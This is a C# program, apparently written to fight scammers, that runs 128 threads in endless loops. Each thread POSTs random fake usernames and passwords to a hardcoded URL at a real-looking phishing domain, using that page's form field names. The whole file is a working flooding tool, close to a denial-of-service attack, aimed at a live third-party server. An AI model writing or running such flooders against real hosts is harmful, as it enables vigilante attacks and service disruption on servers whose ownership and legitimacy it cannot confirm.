﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

namespace 专治骗子
{
    class Program
    {
        static string userkey = "asi121fsaf18f8sbhf819fb81b2f8921b89fbs89fb189fb891bf81b8as112512";
        static string passwordkey = "ssaffbghgshngko1824y219hbasf912y49821sbaf18fb182rfb921fb89fb8912f8b9";
        static string submitkey = "tijiao";
        static string submitvalue = "%E6%8F%90%CD%8F%CD%8F%CD%8F%CD%8F%E4%BA%A4";
        static int count = 0;
        static void Main(string[] args)
        {
            for (int i = 0; i < 128; i++) {//128线程
                System.Threading.Thread.Sleep(50);
                new System.Threading.Thread(subThread).Start();
            }
        }
        public static object syncobj = new object();
        public static void subThread() {

            while (true)
            {
                String fakeuser = GenerateRandomSequence("1234567890", 7, 10);
                String fakepass = GenerateRandomSequence("1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM！@#￥%……&*()_+-=[];',./<>?:\"{}\\`~", 6, 12);
                Dictionary<String, String> submitkeyvalue = new Dictionary<string, string>();
                submitkeyvalue.Add(userkey, fakeuser);
                submitkeyvalue.Add(passwordkey, System.Web.HttpUtility.UrlEncode(fakepass));
                submitkeyvalue.Add(submitkey, submitvalue);
                String result = "";
                try
                {
                    result=(Post("http://www.ko08w1.site/adazero.php", submitkeyvalue));
                    count++;
                }
                catch (Exception ex)
                {
                    result =(ex.Message);
                }
                lock (syncobj) {
                    Console.WriteLine("USER=" + fakeuser);
                    Console.WriteLine("PASS=" + fakepass);
                    Console.WriteLine(result);
                    Console.Title = count.ToString();
                    Console.WriteLine("-------------------------------------------");
                }
            }
        }

        public static string GenerateRandomSequence(string charpool, int minlen, int maxlen) {
            StringBuilder sb = new StringBuilder();
            Random rnd = new Random();
            int len = minlen + (rnd.Next() % (maxlen - minlen + 1));
            for (int i = 0; i < len; i++) {
                sb.Append(charpool[rnd.Next() % charpool.Length]);
            }
            return sb.ToString();
        }

        public static string Post(string url, Dictionary<string, string> dic)
        {
            string result = "";
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Timeout = 5000;
            req.Method = "POST";
            req.ContentType = "application/x-www-form-urlencoded";
            #region 添加Post 参数
            StringBuilder builder = new StringBuilder();
            int i = 0;
            foreach (var item in dic)
            {
                if (i > 0)
                    builder.Append("&");
                builder.AppendFormat("{0}={1}", item.Key, item.Value);
                i++;
            }
            byte[] data = Encoding.UTF8.GetBytes(builder.ToString());
            req.ContentLength = data.Length;
            using (Stream reqStream = req.GetRequestStream())
            {
                reqStream.Write(data, 0, data.Length);
                reqStream.Close();
            }
            req.AllowAutoRedirect = false;
            #endregion
            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
            Stream stream = resp.GetResponseStream();
            //获取响应内容
            using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
            {
                result = reader.ReadToEnd();
            }
            return result;
        }
    }
}
